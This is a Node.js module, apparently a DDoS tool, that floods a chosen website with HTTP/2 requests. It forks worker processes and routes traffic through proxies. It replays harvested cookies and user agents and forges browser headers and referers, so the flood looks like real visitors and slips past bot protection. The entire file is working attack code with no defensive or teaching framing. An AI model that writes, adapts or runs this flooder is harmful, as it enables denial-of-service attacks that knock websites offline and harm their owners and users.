///Browser Emulation
var flooderHTTP2 = function (option = {}) {
  require('events').EventEmitter.defaultMaxListeners = 0;
  process.on("uncaughtException", (e) => {});
  process.on("unhandledRejection", (e) => {});
  ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  const http = require('http');
  const http2 = require('http2');
  const tls = require('tls');
  const fs = require("fs");
  var targetPort = 443;

  const args = {
    host: option.host,
    time: option.time,
    reqs: option.reqsperip,
    process_count: option.thread,
    successCookie: option.successCookie,
  };
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  const urlParsed = new URL(args.host);
  const cluster = require('cluster');
  const numCPUs = args.process_count;
  if (cluster.isPrimary) {
    for (let i = 0; i < numCPUs; i++) {
      console.log(`[Info] | Thread: ${i} Created.`);
      cluster.fork();
    }
    cluster.on('exit', (worker, code, signal) => {
      console.log(`[Info] | Connection: ${worker.process.pid} Closing.`);
      cluster.fork();
    });
  } else {
  if(urlParsed.protocol=="http"){
    targetPort = 80;
  }else if(urlParsed.protocol=="https"){
    targetPort = 443;
  }
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const UAs = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0",
  "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
  "Mozilla/5.0 (Android 11; Mobile; rv:99.0) Gecko/99.0 Firefox/99.0",
  "Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/99.0.4844.59 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 OPR/52.0.2871.99",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 OPR/49.0.2725.64",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36 OPR/43.0.2442.806",
  "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.168 Safari/537.36 OPR/51.0.2830.40",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 OPR/84.0.4316.21",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; rv:33.1) Gecko/20100101 Firefox/33.1",
  "Mozilla/5.0 (Windows NT 10.0; rv:50.0) Gecko/20100101 Firefox/50.0",
  "Mozilla/5.0 (Windows NT 10.0; rv:59.0) Gecko/20100101 Firefox/59.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2376.69 Safari/537.36",
];
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  var totalCookie = option.successCookie;
  totalCookie.forEach(output => {
    var proxySplit = output.split("!!!");
    var cookieSplit = proxySplit[1].split("|||||");

    setInterval(() => {
        var proxy = proxySplit[0].split(":");
        var cookie = cookieSplit[0];
        var useragent = cookieSplit[1];

        const request = http.request({
          method: 'CONNECT',
          host: proxy[0],
          port: proxy[1],
          path: urlParsed.host + ":"+targetPort,
          headers: { 'Host': urlParsed.host + ":"+targetPort, 'Proxy-Connection': 'Keep-Alive', 'Connection': 'Keep-Alive' }
        })
        request.on('connect', (res, socket) => {
          if (res.statusCode !== 200)
            throw new Error('[Error] | Connection Rejected By Proxy.')
          const client = http2.connect(args.host, { socket })
          client.on('connect', () => {
            console.log('[Info] | Proxy Connected. | Success Rate: 100%')
          })
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
          for (let i = 0; i < args.reqs; ++i) {
              const req = client.request({
                ':authority': urlParsed.host,
                ':path': urlParsed.pathname,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'referer': 'https://www.google.com/, https://www.cloudflare.com/, https://aws.amazon.com/',
                'sec-ch-ua': 'Not A;Brand";v="99", "Chromium";v="99", "Opera";v="86", "Microsoft Edge";v="100", "Google Chrome";v="101',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                ///'sec-fetch-dest': 'document',
                'TE': 'trailers',
                'Pragma': 'no-cache',
                'Cache-Control': 'max-age=0',
                'sec-fetch-dest': 'empty',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': 1,
                'cookie': cookie,
                'user-agent': useragent,
              })
              req.on('data', (buffer) => {
              })
              req.on('end', () => {

                client.close()
              })

            }
        })
        request.end()
    });
  });
}
  console.log('[Info] | [New Browser Started] [Target]: '+args.host);
}
module.exports = { flooderHTTP2: flooderHTTP2};
